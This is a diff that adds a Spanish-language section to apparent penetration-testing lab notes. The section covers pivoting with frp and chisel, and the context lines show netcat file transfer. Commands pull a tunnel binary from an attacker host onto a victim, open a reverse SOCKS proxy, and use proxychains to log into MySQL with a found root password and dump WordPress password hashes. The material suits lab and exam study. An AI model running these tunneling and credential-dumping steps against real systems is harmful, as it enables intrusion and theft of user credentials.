@@ -141,3 +141,60 @@ nc 10.10.14.22 443 < file_encrypt
 #Maquina que recibe
 nc -nlvp 4444 > file
 ```
+
+# [](#header-1)Proxis
+frp
+Primero iniciamos en la maquina atacante el servidor, en esta ocasion usaremos la configuracion de default
+nohup ./frps -p 7000 &
+
+Despues hacemos cambios en el archivo frpc.ini, cambiando la IP del servidor a la del atacante. Los descargamos a la maquina victima y ejecutamos
+chmod +x frpc
+nohup ./frpc -c frpc_1.ini &
+
+Chisel
+Vamos a usar una herramienta llamada <a href="https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz">chisel</a> para hacer el port forwarding con el contenedor que tenemos enfrente y esta permitido para usarlo en el OSCP.
+
+Asi que lo primero seria descomprimirlo, luego quitarle peso con upx y abrir nuestro servidor http con python para descargarlo del otro lado. 
+
+Y al final desde el contenedor ejecutamos:
+
+```s
+curl http://10.10.14.29/chisel_1.7.7_linux_amd64 > chisel
+#Le damos permisos
+chmod +x chisel
+
+./chisel client 10.10.14.29:1234 R:socks
+```
+
+Del lado de la atacante
+
+```s
+./chisel server --reverse -p 1234
+```
+
+Una vez establecida la comunicacion, hacemos una modificacion en el archivo /etc/proxychains.conf
+Agregamos la siguiente linea:
+
+```s
+socks5 127.0.0.1 1080
+```
+
+Y ahora configuramos el foxyproxy con socks5, puerto 127.0.0.1 y puerto 1080 para poder llegar a estas maquinas desde el navegador.
+
+![104](/assets/images/Toby/104_access.png)
+
+Tambien podemos intentar romper el cifrado de las contrasenas de la DB que teniamos.
+
+Accedemos a la base de datos con:
+
+```SQL
+proxychains mysql -uroot -pOnlyTheBestSecretsGoInShellScripts -h 172.69.0.102
+
+show databases;
+
+show tables;
+
+describe wp_users;
+
+select user_login,user_pass from wp_users;
+```
